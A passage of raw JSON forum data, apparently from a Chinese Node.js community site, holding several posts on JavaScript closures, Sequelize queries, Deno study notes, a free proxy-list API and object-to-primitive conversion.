console.log(counter)，得到undefined的结果,显然不是这样的。</p>\n<p>也许，当你调用<code>increment</code>时，它会以某种方式返回它创建的函数(createCounter)?这怎么可能呢?变量<code>increment</code>包含函数定义，而不是函数的来源，显然也不是这样的。</p>\n<p>所以一定有另一种机制。<strong>闭包</strong>，我们终于找到了，丢失的那块。</p>\n<p>它是这样工作的，无论何时声明新函数并将其赋值给变量，都要存储函数定义和闭包。闭包包含在函数创建时作用域中的所有变量，它类似于背包。函数定义附带一个小背包，它的包中存储了函数定义创建时作用域中的所有变量。</p>\n<p>所以我们上面的解释都是错的，让我们再试一次，但是这次是正确的。</p>\n<pre class=\"prettyprint language-javascript\"><code> 1: function createCounter() {\n 2:   let counter = 0\n 3:   const myFunction = function() {\n 4:     counter = counter + 1\n 5:     return counter\n 6:   }\n 7:   return myFunction\n 8: }\n 9: const increment = createCounter()\n10: const c1 = increment()\n11: const c2 = increment()\n12: const c3 = increment()\n13: console.log(&#x27;example increment&#x27;, c1, c2, c3)\n</code></pre><ul>\n<li>同上， 行1 - 8。我们在全局执行上下文中创建了一个新的变量createCounter，它得到了指定的函数定义。</li>\n<li>同上，第9行。我们在全局执行上下文中声明了一个名为<code>increment</code>的新变量。</li>\n<li>同上，第9行。我们需要调用<code>createCounter</code>函数并将其返回值赋给<code>increment</code>变量。</li>\n<li>同上，行1 - 8。调用函数，创建新的本地执行上下文。</li>\n<li>同上，第2行。在本地执行上下文中，声明一个名为<code>counter</code>的新变量并赋值为 0 。</li>\n<li>行3 - 6。声明一个名为<code>myFunction</code>的新变量，变量在本地执行上下文中声明,变量的内容是另一个函数定义。如第4行和第5行所定义，现在我们还创建了一个闭包，并将其作为函数定义的一部分。闭包包含作用域中的变量，在本例中是变量<code>counter</code>(值为0)。</li>\n<li>第7行。返回<code>myFunction</code>变量的内容,删除本地执行上下文。<code>myFunction</code>和<code>counter</code>不再存在。控制权交给了调用上下文，我们返回函数定义和它的闭包，闭包中包含了创建它时在作用域内的变量。</li>\n<li>第9行。在调用上下文(全局执行上下文)中，<code>createCounter</code>返回的值被指定为<code>increment</code>，变量<code>increment</code>现在包含一个函数定义(和闭包),由createCounter返回的函数定义,它不再标记为<code>myFunction</code>，但它的定义是相同的,在全局上下文中，称为<code>increment</code>。</li>\n<li>第10行。声明一个新变量(c1)。</li>\n<li>继续第10行。查找变量<code>increment</code>，它是一个函数，调用它。它包含前面返回的函数定义,如第4-5行所定义的。(它还有一个带有变量的闭包)。</li>\n<li>创建一个新的执行上下文，没有参数，开始执行函数。</li>\n<li>第4行。counter = counter + 1，寻找变量 <code>counter</code>，在查找本地或全局执行上下文之前，让我们检查一下闭包，瞧，闭包包含一个名为<code>counter</code>的变量，其值为0。在第4行表达式之后，它的值被设置为1。它再次被储存在闭包里，闭包现在包含值为1的变量 <code>counter</code>。</li>\n<li>第5行。我们返回<code>counter的值</code>，销毁本地执行上下文。</li>\n<li>回到第10行。返回值(1)被赋给变量<code>c1</code>。</li>\n<li>第11行。我们重复步骤10-14。这一次，在闭包中此时变量<code>counter</code>的值是1。它在第12步设置的，它的值被递增并以2的形式存储在递增函数的闭包中,c2被赋值为2。</li>\n<li>第12行。重复步骤10-14,<code>c3</code>被赋值为3。</li>\n<li>第13行。我们打印变量c1 c2和c3的值。</li>\n</ul>\n<p>您可能会问，是否有任何函数具有闭包，甚至是在全局范围内创建的函数?答案是肯定的。在全局作用域中创建的函数创建闭包，但是由于这些函数是在全局作用域中创建的，所以它们可以访问全局作用域中的所有变量，闭包的概念并不重要。</p>\n<p>当函数返回函数时，闭包的概念就变得更加重要了。返回的函数可以访问不属于全局作用域的变量，但它们仅存在于其闭包中。</p>\n<h3>闭包不是那么简单</h3>\n<p>有时候闭包在你甚至没有注意到它的时候就会出现，你可能已经看到了我们称为部分应用程序的示例，如下面的代码所示：</p>\n<pre class=\"prettyprint language-javascript\"><code>let c = 4\nconst addX = x =&gt; n =&gt; n + x\nconst addThree = addX(3)\nlet d = addThree(c)\nconsole.log(&#x27;example partial application&#x27;, d)\n</code></pre><p>如果箭头函数让您感到困惑，下面是同样效果：</p>\n<pre class=\"prettyprint language-javascript\"><code>let c = 4\nfunction addX(x) {\n  return function(n) {\n     return n + x\n  }\n}\nconst addThree = addX(3)\nlet d = addThree(c)\nconsole.log(&#x27;example partial application&#x27;, d)\n</code></pre><p>我们声明一个能用加法函数<code>addX</code>，它接受一个参数(x)并返回另一个函数。返回的函数还接受一个参数并将其添加到变量<code>x</code>中。</p>\n<p>变量<code>x</code>是闭包的一部分，当变量<code>addThree</code>在本地上下文中声明时，它被分配一个函数定义和一个闭包，闭包包含变量x。</p>\n<p>所以当<code>addThree</code>被调用并执行时，它可以从闭包中访问变量<code>x</code>以及为参数传递变量<code>n</code>并返回两者的和 7。</p>\n<h3>总结</h3>\n<p>我将永远记住闭包的方法是通过背包的类比。当一个函数被创建并传递或从另一个函数返回时，它会携带一个背包。背包中是函数声明时作用域内的所有变量。</p>\n<h3>参考</h3>\n<ul>\n<li><a href=\"https://blog.fundebug.com/2017/07/31/javascript-closure/\">解密JavaScript闭包</a></li>\n<li><a href=\"https://blog.fundebug.com/2017/07/17/10-javascript-difficulties/\">10个JavaScript难点</a></li>\n</ul>\n<h3>关于Fundebug</h3>\n<p><a href=\"https://www.fundebug.com/\">Fundebug</a>专注于JavaScript、微信小程序、微信小游戏、支付宝小程序、React Native、Node.js和Java线上应用实时BUG监控。 自从2016年双十一正式上线，Fundebug累计处理了10亿+错误事件，付费客户有Google、360、金山软件、百姓网等众多品牌企业。欢迎大家<a href=\"https://www.fundebug.com/team/create\">免费试用</a>！</p>\n<p><img src=\"https://static.fundebug.cn/wechat_slogan.png\" alt></p>\n</div>","title":"我从来不理解JavaScript闭包，直到有人这样向我解释它...","last_reply_at":"2019-02-19T01:18:03.006Z","good":false,"top":false,"reply_count":4,"visit_count":2079,"create_at":"2019-02-12T03:40:40.147Z","author":{"loginname":"Fundebug","avatar_url":"https://avatars2.githubusercontent.com/u/26496557?v=4&s=120"}},{"id":"5c63dc4a0752e020af943300","author_id":"5bf517a1e6481c5709f5de14","tab":"ask","content":"<div class=\"markdown-text\"><h5>代码</h5>\n<pre class=\"prettyprint\"><code>const group = await Cabinet.findAll({\n        include: [tagsInfo],\n        where: opt,\n        attributes: [&quot;groupName&quot;, &quot;type&quot;],\n        group: [&quot;groupName&quot;, &quot;type&quot;],\n        logging: console.log,\n});\n</code></pre><h5>生成的查询语句</h5>\n<p>SELECT “Cabinet”.“id”, “Cabinet”.“groupName”, “Cabinet”.“type”, “tags”.“id” AS “<a href=\"http://tags.id\">tags.id</a>”, “tags”.“name” AS “<a href=\"http://tags.name\">tags.name</a>”, “tags”.“type” AS “tags.type”, “tags”.“pid” AS “tags.pid”, “tags-&gt;cabinet_tags_map”.“createdAt” AS “tags.cabinet_tags_map.createdAt”, “tags-&gt;cabinet_tags_map”.“updatedAt” AS “tags.cabinet_tags_map.updatedAt”, “tags-&gt;cabinet_tags_map”.“TagId” AS “tags.cabinet_tags_map.TagId”, “tags-&gt;cabinet_tags_map”.“CabinetId” AS “tags.cabinet_tags_map.CabinetId” FROM “cabinet_cabinet” AS “Cabinet” LEFT OUTER JOIN ( “cabinet_tags_map” AS “tags-&gt;cabinet_tags_map” INNER JOIN “cabinet_tags” AS “tags” ON “tags”.“id” = “tags-&gt;cabinet_tags_map”.“TagId”) ON “Cabinet”.“id” = “tags-&gt;cabinet_tags_map”.“CabinetId” AND (“tags”.“deletedAt” &gt; ‘2019-02-13 16:33:33.971 +08:00’ OR “tags”.“deletedAt” IS NULL) WHERE (“Cabinet”.“deletedAt” &gt; ‘2019-02-13 16:33:33.971 +08:00’ OR “Cabinet”.“deletedAt” IS NULL) GROUP BY “groupName”, “type”;</p>\n<h5>问题</h5>\n<pre class=\"prettyprint\"><code>查询语句第一行中的select中 除了我需要查询的字段  groupName ,  type  之外多出了很多无用的字段，这些导致报错\n</code></pre><p><code>column &quot;Cabinet.id&quot; must appear in the GROUP BY clause or be used in an aggregate function</code>\n\t这有没有办法去除？\n\t如果可以的话希望大佬们能更改下代码，我去研究研究</p>\n</div>","title":"sequelize 使用 find&findAll查询时，能否去除多余查询的列？","last_reply_at":"2019-02-18T10:42:26.015Z","good":false,"top":false,"reply_count":6,"visit_count":920,"create_at":"2019-02-13T08:58:50.784Z","author":{"loginname":"91hanbao","avatar_url":"https://avatars0.githubusercontent.com/u/15627199?v=4&s=120"}},{"id":"5c67debf0752e020af9443b5","author_id":"5c67de0e0752e020af9443ad","tab":"ask","content":"<div class=\"markdown-text\"><p>我现有一个虚拟主机，使用的是cPanel管理的，里面有支持创建 nodeJS 应用功能，但不知道如何能将 egg 的应用部署上去？\n谢啦！</p>\n</div>","title":"请问 egg 是否劫持部署到虚拟主机上？","last_reply_at":"2019-02-18T00:15:28.257Z","good":false,"top":false,"reply_count":3,"visit_count":819,"create_at":"2019-02-16T09:58:23.168Z","author":{"loginname":"winsonet","avatar_url":"https://avatars1.githubusercontent.com/u/1869995?v=4&s=120"}},{"id":"5c695e240752e020af9447f6","author_id":"5a203882110a338547d6e360","tab":"share","content":"<div class=\"markdown-text\"><p>先放地址</p>\n<pre class=\"prettyprint\"><code>https:&#x2F;&#x2F;proxys.herokuapp.com\n</code></pre><p>这是一个利用爬虫抓取<a href=\"https://www.xicidaili.com/\">西刺代理</a>和<a href=\"https://free-proxy-list.net/\">FreeProxyList</a>上免费的代理，检测其中可用的高质量的代理，并且提供了检测后的高质量代理API，如果有做爬虫的，可以看看哈。。</p>\n<p>检测原理就是配置代理后请求<a href=\"http://www.ip-api.com/json\">ip-api</a>,检查返回值’status’是否为’success’</p>\n<p>如果有兴趣的话，可以下载下来部署到自己的服务器</p>\n<p>项目地址在<a href=\"https://github.com/LuckyHH/HttpProxy\">这里</a></p>\n<p>API调用规则看<a href=\"https://github.com/LuckyHH/HttpProxy/blob/master/README.md\">这里</a></p>\n</div>","title":"免费高质量的HTTP代理分享","last_reply_at":"2019-02-17T13:14:12.714Z","good":false,"top":false,"reply_count":0,"visit_count":1147,"create_at":"2019-02-17T13:14:12.714Z","author":{"loginname":"LuckyHH","avatar_url":"https://avatars3.githubusercontent.com/u/22864183?v=4&s=120"}},{"id":"5b0fb21b57137f22415c47c8","author_id":"4f447c2f0a8abae26e01b27d","tab":"share","content":"<div class=\"markdown-text\"><p><img src=\"//static.cnodejs.org/FnyDQCGzJxYlIZP2aTijBpdHe3iS\" alt=\"image.png\"></p>\n<hr>\n<p><img src=\"//static.cnodejs.org/Fuc4ibX0pjmpuqBpLo8FkH-3D6l8\" alt=\"image.png\"></p>\n</div>","title":"deno issue 的狂欢，是中国开发者的耻辱柱","last_reply_at":"2019-02-17T11:28:49.860Z","good":true,"top":false,"reply_count":52,"visit_count":9210,"create_at":"2018-05-31T08:28:11.616Z","author":{"loginname":"atian25","avatar_url":"https://avatars2.githubusercontent.com/u/227713?v=4&s=120"}},{"id":"5c691d070752e020af944663","author_id":"56c336a38442f7e03c7316ae","tab":"share","content":"<div class=\"markdown-text\"><h2>GitHub地址</h2>\n<p><a href=\"https://github.com/chenshenhai/deno_note/\">https://github.com/chenshenhai/deno_note/</a></p>\n<h4>例子源码集成测状态</h4>\n<p><a href=\"https://travis-ci.com/chenshenhai/deno_note\"><img src=\"https://travis-ci.com/chenshenhai/deno_note.svg?token=XYNG2F1URZ4nW1TzoJNC&amp;branch=master\" alt=\"Build Status\"></a>\n<a href=\"https://dev.azure.com/chenshenhai/chenshenhai/_build/latest?definitionId=1&amp;branchName=master\"><img src=\"https://dev.azure.com/chenshenhai/chenshenhai/_apis/build/status/chenshenhai.deno_note?branchName=master\" alt=\"Build Status\"></a></p>\n<h2>前言</h2>\n<p>Deno自2018年6月诞生，引发JavaScript开发社区的强烈讨论，很多开发者误解甚至还纷纷传言ry大神将以Deno作为下一代Node.js，甚至还闹出了啼笑皆非的issue盖楼闹剧。 到了2018年底至2019年初，在JavaScript社区里，Deno的相关讨论声音渐渐消退，更多是谈论TypeScript是否将引领下一波前端开发潮流，甚至带动Deno起飞。</p>\n<p><img src=\"https://user-images.githubusercontent.com/8216630/52910348-388f9b80-32d1-11e9-85d2-ca900e02cfc9.png\" alt=\"deno_note mini\"></p>\n<p>既然有新东西可以玩，先不管别人怎么议论，工具好不好得自己用了才知道。面对一个新生技术，人云亦云和断章取义不是一个技术开发者的应有的行为。</p>\n<p>趁着2019年春节在家，好好利用这个“寒假”玩玩这个新技术。截止2019年初，Deno国内外资料实在太少。 除了出现 <a href=\"https://github.com/denolib/guide\">《deno核心指南》</a> 以 及对应的GitHub组织 <a href=\"https://github.com/denolib\">github.com/denolib</a> 推荐的学习文档比较有建设性，除此之外，对于deno的开发资料乏善可陈。</p>\n<p>Deno基本模块和官方标准模块 deno_std 处于开发中不稳定状态，存在一堆 <code>// TODO</code>  的代码。2019年春节假期中，我硬生生啃了好几个国外 Deno 试验项目仓库。开始写下这本《Deno进阶开发笔记》 ，一来是作为自己学习Deno的笔记记录，二来希望能给Deno开发社区添砖加瓦。</p>\n<h2>Deno目前状况</h2>\n<blockquote>\n<p>官方声明<br>\nA word of caution: Deno is very much under development. We encourage brave early adopters, but expect bugs large and small. The API is subject to change without notice. Bug reports do help!</p>\n</blockquote>\n<p>翻译过来就是：</p>\n<blockquote>\n<p>Deno 正处于开发阶段，官方鼓励勇敢的早期的使用者，并希望在使用过程中尽量少出现问题。API 可能随时更改，恕不另行通知。</p>\n</blockquote>\n<blockquote>\n<p>官方主旨\nDeno aims to be a productive and secure scripting environment for the modern programmer.</p>\n</blockquote>\n<p>翻译过来就是：</p>\n<blockquote>\n<p>Deno 旨在为现代程序员提供高效，安全的脚本环境。</p>\n</blockquote>\n<h2>Deno官方目标</h2>\n<ul>\n<li>\n<p>支持 TypeScript 的直接使用，无需人为去编译。</p>\n</li>\n<li>\n<p>允许像浏览器一样import URL链接的模块，例如：</p>\n<ul>\n<li><code>import * as log from &quot;https://deno.land/x/std/log/mod.ts&quot;;</code></li>\n</ul>\n</li>\n<li>\n<p>远程代码的引用获取只需一次，会缓存到本地，直至执行  --reload  强制更新远程代码。</p>\n</li>\n<li>\n<p>可以直接使用 <code>ES Modules</code>  ，但不支持 CommonJS 的 <code>require( )</code>   。</p>\n</li>\n<li>\n<p>文件系统，网络权限都需要用户的授权允许后才能操作 。</p>\n</li>\n<li>\n<p>只需要一个可执行的文件就可以运行程序 。</p>\n</li>\n<li>\n<p>遇到未捕获的异常会直接终止程序</p>\n</li>\n<li>\n<p>浏览器兼容性，如果Deno项目全是JavaScript实现，同时没有使用 deno  全局命名空间，就可以直接在现代浏览器运行。</p>\n</li>\n<li>\n<p>将会支持顶级执行 <code>await</code> 代码。</p>\n</li>\n<li>\n<p>其他非目标特性：</p>\n<ul>\n<li>无<code>package.json</code></li>\n<li>无<code>npm</code></li>\n<li>不会兼容<code>Node</code></li>\n</ul>\n</li>\n</ul>\n<h2>本书(笔记)目标</h2>\n<ul>\n<li>从实际 工程应用 层面去学习 Deno 的使用，暂时不会深究底层原理。</li>\n<li>以 Deno 原生的能力实现相关代码，不依赖官方标准模块  deno_std  (但是单元测试除外)。</li>\n<li>以  TDD  开发模式结合集成测试保证 例子demo适应各种生产环境。</li>\n</ul>\n<h2>本书(笔记)目录</h2>\n<ul>\n<li>1 致读者\n<ul>\n<li><a href=\"https://github.com/chenshenhai/deno_note/blob/master/note/chapter_01/01.md\">1.1 本书初衷</a></li>\n<li><a href=\"https://github.com/chenshenhai/deno_note/blob/master/note/chapter_01/02.md\">1.2 参考资料</a></li>\n</ul>\n</li>\n<li>2 快速开始\n<ul>\n<li><a href=\"https://github.com/chenshenhai/deno_note/blob/master/note/chapter_02/01.md\">2.1 快速安装</a></li>\n<li><a href=\"https://github.com/chenshenhai/deno_note/blob/master/note/chapter_02/02.md\">2.2 快速使用</a></li>\n</ul>\n</li>\n<li>3 前置基础知识\n<ul>\n<li><a href=\"https://github.com/chenshenhai/deno_note/blob/master/note/chapter_03/01.md\">3.1 deno和Node.js</a></li>\n<li><a href=\"https://github.com/chenshenhai/deno_note/blob/master/note/chapter_03/02.md\">3.2 缓冲区基础知识点</a></li>\n<li><a href=\"https://github.com/chenshenhai/deno_note/blob/master/note/chapter_03/03.md\">3.3 TypeScript基础</a></li>\n</ul>\n</li>\n<li>4 deno基础知识点\n<ul>\n<li><a href=\"https://github.com/chenshenhai/deno_note/blob/master/note/chapter_04/01.md\">4.1 deno常用命令简介</a></li>\n<li><a href=\"https://github.com/chenshenhai/deno_note/blob/master/note/chapter_04/02.md\">4.2 deno模块体系</a></li>\n<li><a href=\"https://github.com/chenshenhai/deno_note/blob/master/note/chapter_04/03.md\">4.3 deno平台API</a></li>\n<li><a href=\"https://github.com/chenshenhai/deno_note/blob/master/note/chapter_04/04.md\">4.4 deno系统API</a></li>\n<li><a href=\"https://github.com/chenshenhai/deno_note/blob/master/note/chapter_04/05.md\">4.5 deno文件操作API</a></li>\n<li><a href=\"https://github.com/chenshenhai/deno_note/blob/master/note/chapter_04/06.md\">4.6 deno目录操作API</a></li>\n<li><a href=\"https://github.com/chenshenhai/deno_note/blob/master/note/chapter_04/07.md\">4.7 deno删除操作API</a></li>\n<li>[4.x deno其他常用API] <code>// TODO</code></li>\n</ul>\n</li>\n<li>5 基础进阶学习\n<ul>\n<li><a href=\"https://github.com/chenshenhai/deno_note/blob/master/note/chapter_05/01.md\">5.1 单元测试</a></li>\n<li><a href=\"https://github.com/chenshenhai/deno_note/blob/master/note/chapter_05/02.md\">5.2 单元测试进阶</a></li>\n<li><a href=\"https://github.com/chenshenhai/deno_note/blob/master/note/chapter_05/03.md\">5.3 集成测试</a></li>\n<li><a href=\"https://github.com/chenshenhai/deno_note/blob/master/note/chapter_05/04.md\">5.4 文件/目录操作</a></li>\n<li><a href=\"https://github.com/chenshenhai/deno_note/blob/master/note/chapter_05/06.md\">5.5 Buffer进阶读操作</a></li>\n<li>[5.6 Buffer进阶写操作] <code>// TODO</code></li>\n<li><a href=\"https://github.com/chenshenhai/deno_note/blob/master/note/chapter_05/07.md\">5.7 原生deno实现简单HTTP服务</a></li>\n<li><a href=\"https://github.com/chenshenhai/deno_note/blob/master/note/chapter_05/08.md\">5.8 原生deno处理HTTP请求</a></li>\n<li><a href=\"https://github.com/chenshenhai/deno_note/blob/master/note/chapter_05/09.md\">5.9 原生deno处理HTTP响应</a></li>\n<li><a href=\"https://github.com/chenshenhai/deno_note/blob/master/note/chapter_05/10.md\">5.10 原生deno实现稳定HTTP服务</a></li>\n</ul>\n</li>\n<li>6 WEB进阶开发\n<ul>\n<li>[6.1 中间件式框架简单实现]  <code>// TODO</code></li>\n<li>[6.2 中间件-路由实现]  <code>// TODO</code></li>\n<li>[6.3 中间件-静态资源实现]  <code>// TODO</code></li>\n<li>[6.4 HTML模板编译实现]  <code>// TODO</code></li>\n<li>[6.5 文件同步上传功能实现]  <code>// TODO</code></li>\n<li>[6.6 文件异步上传功能实现]  <code>// TODO</code></li>\n</ul>\n</li>\n<li>7 工具类开发\n<ul>\n<li>[7.1 CLI功能实现]  <code>// TODO</code></li>\n<li>[7.2 MySQL通信]   <code>// TODO</code></li>\n</ul>\n</li>\n<li>8 发布模块\n<ul>\n<li>[8.1 GitHub发布模块版本]  <code>// TODO</code></li>\n<li>[8.2 其他发布方式]  <code>// TODO</code></li>\n</ul>\n</li>\n</ul>\n<h2>本书(笔记)特点</h2>\n<ul>\n<li>本书笔记内容不定时更新，如果想第一时间知道本书进展，可以在GitHub watch 本项目。</li>\n<li>TDD开发例子，功能例子都以 TDD(Test-Driven Development) 开发模式为主，一个功能模块，配备对应的单元测试。</li>\n<li>以  Deno 原生的能力实现相关代码，不依赖官方标准块  deno_std (单元测试除外)。</li>\n<li>Travis CI build，用于集成构建测试在Linux环境下所有单元测试。</li>\n<li>Azure Pipelines，用于集成构建测试在Window|Mac|Ubuntu环境下所有单元测试，保证例子在各个生产环境都能正常执行。</li>\n</ul>\n<p><a href=\"https://travis-ci.com/chenshenhai/deno_note\"><img src=\"https://travis-ci.com/chenshenhai/deno_note.svg?token=XYNG2F1URZ4nW1TzoJNC&amp;branch=master\" alt=\"Build Status\"></a>\n<a href=\"https://dev.azure.com/chenshenhai/chenshenhai/_build/latest?definitionId=1&amp;branchName=master\"><img src=\"https://dev.azure.com/chenshenhai/chenshenhai/_apis/build/status/chenshenhai.deno_note?branchName=master\" alt=\"Build Status\"></a></p>\n<h2>后记</h2>\n<p>本书目前虽然开源了，但是仍然处于长期的编辑和更新阶段，如有学习交流和共建的想法，欢迎在GitHub本项目上提交 issue 和 PR。</p>\n</div>","title":"《Deno进阶开发笔记》开源啦，将长期不定时更新","last_reply_at":"2019-02-17T08:56:41.794Z","good":false,"top":false,"reply_count":3,"visit_count":945,"create_at":"2019-02-17T08:36:23.753Z","author":{"loginname":"ChenShenhai","avatar_url":"https://avatars3.githubusercontent.com/u/8216630?v=4&s=120"}},{"id":"5c64da200752e020af9436f1","author_id":"5ab852d6320bb09d69e231f1","tab":"ask","content":"<div class=\"markdown-text\"><p>我记得以前在论坛上看过一个,就是类似微信通讯录那样查找信息,有没有node.js能使用的相关的包呢?下面图片那样的</p>\n<p><img src=\"//static.cnodejs.org/Fu0KxbRFqJQCzpBqcOYVIjw8_w2o\" alt=\"494190680.jpg\"></p>\n<p><img src=\"//static.cnodejs.org/Fv1Ykd4RmXud9v3ajZ9zD04IZ2xl\" alt=\"webwxgetmsgimg.jpg\"></p>\n</div>","title":"类似微信通讯录,有没有现成的包可以使用呢?","last_reply_at":"2019-02-17T08:55:36.130Z","good":false,"top":false,"reply_count":5,"visit_count":899,"create_at":"2019-02-14T03:01:52.753Z","author":{"loginname":"iori2882","avatar_url":"https://avatars3.githubusercontent.com/u/1480587?v=4&s=120"}},{"id":"5c6556ab0752e020af943a07","author_id":"58d39d9003d476b42d34c684","tab":"ask","content":"<div class=\"markdown-text\"><p>上锁的有没有大佬知道怎么做的，就是为了处理高并发，解决同时访问一个API的时候导致的数据错误</p>\n<p>上锁的有没有大佬知道怎么做的，就是为了处理高并发，解决同时访问一个API的时候导致的数据错误</p>\n<p>上锁的有没有大佬知道怎么做的，就是为了处理高并发，解决同时访问一个API的时候导致的数据错误</p>\n<p>上锁的有没有大佬知道怎么做的，就是为了处理高并发，解决同时访问一个API的时候导致的数据错误</p>\n</div>","title":"关于Egg的事务锁是怎么上的","last_reply_at":"2019-02-15T17:14:07.861Z","good":false,"top":false,"reply_count":3,"visit_count":997,"create_at":"2019-02-14T11:53:15.116Z","author":{"loginname":"vxhly","avatar_url":"https://avatars0.githubusercontent.com/u/17906558?v=4&s=120"}},{"id":"5c66db22f53f161dbaeb42e8","author_id":"556150874eb040084cfe5dcb","tab":"share","content":"<div class=\"markdown-text\"><h2>一个小测试, 试试:</h2>\n<pre class=\"prettyprint\"><code>let o = {\n  valueOf() {\n    return 0;\n  },\n};\nconsole.log(&#x27;&#x27; + o);                                 &#x2F;&#x2F; &#x27;0&#x27;\nconsole.log(&#96;${o}&#96;);                                 &#x2F;&#x2F; &#x27;[object Object]&#x27;\n\nconsole.log(+o);                                    &#x2F;&#x2F; 0\nconsole.log(1 + o);                                 &#x2F;&#x2F; 1\nconsole.log(1 - o);                                 &#x2F;&#x2F; 1\n</code></pre><p>如果你答对了, 可以忽略本文内容了~</p>\n<hr>\n<hr>\n<hr>\n<h2>结论</h2>\n<ol>\n<li>当操作需要一个字符串时, <code>hint</code>=<code>string</code>, 当操作需要一个数字时, <code>hint</code>=<code>number</code>, 当运算符不确定时<code>hint</code>=<code>default</code>.</li>\n<li>如果存在 <code>obj[Symbol.toPrimitive](hint)</code>, 就直接调用</li>\n<li>如果 <code>hint</code> 是 <code>string</code>, 先调用 <code>obj.toString()</code>, 没有再调用 <code>obj.valueOf()</code></li>\n<li>如果 <code>hint</code> 是 <code>number</code>, 先调用 <code>obj.valueOf()</code>, 没有再调用<code>obj.toString()</code></li>\n<li>如果 <code>hint</code> 是 <code>default</code>, <code>Date</code> 按照 <code>hint=string</code>处理, 其它按照 <code>hint=number</code> 处理</li>\n<li>如果 <code>toString</code> 或者 <code>valueOf</code> 返回的不是原始类型, 则忽略该调用, 转向下一个调用, 如果没有下一个调用, 则报错, 但是 <code>toPrimitive</code> 必须返回原始类型, 否则报错</li>\n</ol>\n<h2>详解</h2>\n<h3>根据上下文, 会有以下转换 <code>hint</code></h3>\n<h4><code>string</code></h4>\n<p>当操作需要一个字符串时, 对象转换的 <code>hint</code> 为 <code>string</code>.</p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; alert(参数是字符串)\nalert(obj);\nconfirm(obj);\n\n&#x2F;&#x2F; 对象的属性是字符串\nanotherObj[obj] = 123;\n</code></pre><h4><code>number</code></h4>\n<p>当操作需要一个数字时, 对象转换的 <code>hint</code> 为 <code>number</code>.</p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; 明确转换成数字\nNumber(obj);\n&#x2F;&#x2F; 转换成数字(非加法)\n+obj;\n&#x2F;&#x2F; 数学运算(加法除外)\n1 - obj;\n1 * obj;\n1 &#x2F; obj;\n</code></pre><p><em>因为历史原因大小比较的 <code>hint</code> 也是 <code>number</code></em></p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; hint 为 number\nobj1 &gt; obj2;\n</code></pre><h4><code>default</code></h4>\n<p>当运算符不确定时, 对象转换的 <code>hint</code> 为 <code>default</code>.</p>\n<pre class=\"prettyprint language-js\"><code>&#x2F;&#x2F; 比如加法, 可以是数字相加, 也可以是字符串相加\n1 + obj;\n&#x27;1&#x27; + obj;\n\n&#x2F;&#x2F; == 弱相等比较\n&#x2F;&#x2F; obj == string&#x2F;number&#x2F;symbol\nobj == &#x27;1&#x27;;\nobj == 1;\n</code></pre><p><em>通常, 内置对象(除了 Date 外), <code>default</code> 转换 和 <code>number</code> 转换是相同的</em>\n<em>Date 的 <code>default</code> 转换 和 <code>string</code> 相同 <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Date/@%5B@toPrimitive%5D(/user/toPrimitive)#Description\">Date.prototype[@@toPrimitive]</a></em></p>\n<h3>转换步骤</h3>\n<ol>\n<li>如果存在 <code>obj[Symbol.toPrimitive](hint)</code>, 就直接调用</li>\n<li>如果 <code>hint</code> 是 <code>string</code>, 先调用 <code>obj.toString()</code>, 没有再调用 <code>obj.valueOf()</code></li>\n<li>如果 <code>hint</code> 是 <code>number</code>, 先抵用 <code>obj.valueOf()</code>, 没有再调用<code>obj.toString()</code></li>\n</ol>\n<h3>example</h3>\n<h4>Symbol.toPrimitive</h4>\n<pre class=\"prettyprint language-ts\"><code>type primitiveType = null | undefined | number | boolean | string | symbol;\ntype hintType = &#x27;string&#x27; | &#x27;number&#x27; | &#x27;default&#x27;;\n\nobj[Symbol.toPrimitive] = function(hint: hintType): primitiveType {\n  console.log(&#96;hint is: ${hint}&#96;);\n\n  return hint == &#x27;string&#x27; ? &#x27;一个字符串&#x27; : 0;\n};\n</code></pre><h4>toString / valueOf</h4>\n<pre class=\"prettyprint language-ts\"><code>let user = {\n  name: &#x27;John&#x27;,\n  money: 1000,\n\n  &#x2F;&#x2F; for hint=&quot;string&quot;\n  toString(): string {\n    return &#96;{name: &quot;${this.name}&quot;}&#96;;\n  },\n\n  &#x2F;&#x2F; for hint=&quot;number&quot; or &quot;default&quot;\n  valueOf(): number {\n    return this.money;\n  },\n};\n\nalert(user); &#x2F;&#x2F; toString -&gt; {name: &quot;John&quot;}\nalert(+user); &#x2F;&#x2F; valueOf -&gt; 1000\nalert(user + 500); &#x2F;&#x2F; valueOf -&gt; 1500\n</code></pre><pre class=\"prettyprint language-js\"><code>let obj = {\n  toString() {\n    return &#x27;2&#x27;;\n  },\n};\n\n&#x2F;&#x2F; 加法, 调用 &#96;default&#96; hint, &#96;default&#96; 和 &#96;number&#96; 转换相同,\n&#x2F;&#x2F; 先调用 valueOf 方法, 因为不存在, 所以调用 toString 方法, 返回 &quot;2&quot;\n&#x2F;&#x2F; &quot;2&quot; + 2 = &quot;22&quot;\nalert(obj + 2); &#x2F;&#x2F; &quot;22&quot;\n\n&#x2F;&#x2F; 存在 valueOf, 所以 2+2 = 4\nlet obj = {\n  toString() {\n    return &#x27;2&#x27;;\n  },\n  valueOf() {\n    return 2;\n  },\n};\n\nalert(obj + 2); &#x2F;&#x2F; 4\n</code></pre><pre class=\"prettyprint language-js\"><code>let d = new Date();\nlet d2 = d.getTime() - 1;\n\n&#x2F;&#x2F; 加法, 调用 &#96;default&#96; hint, Date 的 &#96;default&#96; 和 &#96;string&#96; 相同\nalert(1 + d); &#x2F;&#x2F; 1Fri Feb 15 2019 20:59:00 GMT+0800 (China Standard Time)\n\n&#x2F;&#x2F; 减法, 调用 &#96;number&#96; hint\nalert(d - d2); &#x2F;&#x2F; 1\n</code></pre><h2>参考文档</h2>\n<ul>\n<li>\b<a href=\"https://javascript.info/object-toprimitive\">https://javascript.info/object-toprimitive</a></li>\n<li><a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Date/@%5B@toPrimitive%5D(/user/toPrimitive)#Description\">Date.prototype[@@toPrimitive]</a></li>\n</ul>\n<hr>\n<blockquote>\n<p><strong>文章若有纰漏请大家补充指正,谢谢~~</strong><br>\n<a href=\"http://blog.xinshangshangxin.com\">http://blog.xinshangshangxin.com</a> SHANG 殇</p>\n</blockquote>\n</div>","title":"[对象转原始类型]   ('' + obj) !== 